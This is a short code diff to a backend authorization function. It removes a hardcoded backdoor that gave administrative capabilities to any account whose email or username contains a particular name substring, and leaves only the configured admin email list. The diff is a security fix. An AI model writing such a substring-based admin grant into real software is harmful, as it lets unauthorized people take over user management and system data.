@@ -625,7 +625,7 @@ async def get_current_user_with_capabilities(
     # Superadmin guard: always ensure administrative capabilities
     user_email = (user.email or user.username or "").strip().lower()
     admin_email_set = {e.lower().strip() for e in settings.admin_emails}
-    if user_email in admin_email_set or "tanmainguyen" in user_email:
+    if user_email in admin_email_set:
         admin_caps = {"iam:admin", "admin:user_management", "admin", "inventory:approve_request"}
         caps = list(set(caps).union(admin_caps))
 
